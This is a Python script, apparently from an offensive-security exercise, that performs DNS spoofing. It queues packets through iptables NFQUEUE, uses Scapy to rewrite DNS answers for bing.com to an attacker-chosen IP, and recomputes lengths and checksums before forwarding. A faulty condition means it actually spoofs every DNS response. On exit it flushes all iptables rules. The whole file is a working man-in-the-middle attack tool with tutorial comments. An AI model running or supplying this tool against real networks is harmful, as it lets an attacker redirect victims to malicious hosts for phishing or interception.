# This will create a queue for incoming packets to Trap all the requests and reply from Victim and Server
# To trap traffic going out from your computer you need to make it OUTPUT
# iptables -I OUTPUT -j NFQUEUE (Netfilter Queue) --queue-num 0
# iptables -I INPUT -j NFQUEUE (Netfilter Queue) --queue-num 0


# !/usr/bin/env/ python3

import netfilterqueue
import sys
import subprocess
import argparse
from scapy.layers import  inet, dns



def DNS_Main(packet):
    parser = argparse.ArgumentParser(description='DNS Spoof')
    parser.add_argument('-dn', '--dns', metavar="SpoofTO", default="142.250.67.238", type=str,help='Ip of Redirection ')
    args = parser.parse_args()

    # This mechanism gives packet in raw format, so we are conveting to SCAPY FORMAT
    # print(packet.get_payload())  # get_payload method will return the actual detailed content

    # Converting Packet To SCAPY FORMAT to interact with Packets easily and access its Layers
    scapy_format = inet.IP(packet.get_payload())

    print(scapy_format.show())


    # Checking if the packet has DNS response.
    # First now we are trying to capture the DNS response sent from legit DNS server and
    # Forwarding it to victim by modifying the IP of our desire.
    if scapy_format.haslayer(dns.DNSRR):
        # Tearing Down the Packet to Read the qname for the DNS request i.e. URL
        URL_User = (scapy_format[dns.DNSQR].qname).decode("UTF-8")

        # If user surf bing.com modify the IP to your wish
        if URL_User == "www.bing.com" or "bing.com":
            print("[+] Spoofing Target")
            print("[+] Waiting For DNS Responses")

            # rdata is the IP address in DNS response. We are replacing the legit IP with our evil IP
            EvilResponse = dns.DNSRR(rrname=URL_User, rdata=args.dns)

            # Applying the modification in actual packet by injecting out Evil IP Address
            scapy_format[dns.DNS].an = EvilResponse

            # DNS packet also have a field named ancount which indicated how many responses were sent
            # Since have one response we have to modify the ancount field to match the count of our response
            scapy_format[dns.DNS].ancount = 1

            # Now remaining important field to be modified are len and chksum in IP and UDP section
            # We will delete these fields from the packets and Scapy will automatically calculate new values for them
            # Deleting from IP and UDP section

            del scapy_format[dns.IP].len
            del scapy_format[dns.IP].chksum

            del scapy_format[dns.UDP].len
            del scapy_format[dns.UDP].chksum


            # Converting the modified Scapy Formatted packet to normal string and payloading
            packet.set_payload(bytes(scapy_format))




    # we have 2 options after trapping the packets i.e. accept and drop
    # This will forward the packet
    packet.accept()

    # This will drop the packets
    # packet.drop()



if __name__ == '__main__':

    try:
        # The Forward will capture the packetscoming from others Computer
        # subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])

        subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
        subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])

        # Instance of Netfilter object and storing in variable
        Trap = netfilterqueue.NetfilterQueue()

        # This will bind to our created queue.
        # The function in arg will execute in every trapped packet.
        # Process_packet is call back function
        # 0 is the number we gave to our queue in iptables
        Trap.bind(0, DNS_Main)

        # This will run queue
        Trap.run()

    except KeyboardInterrupt:
        # This will flush the queue
        subprocess.call(["iptables", "--flush"])
        sys.exit()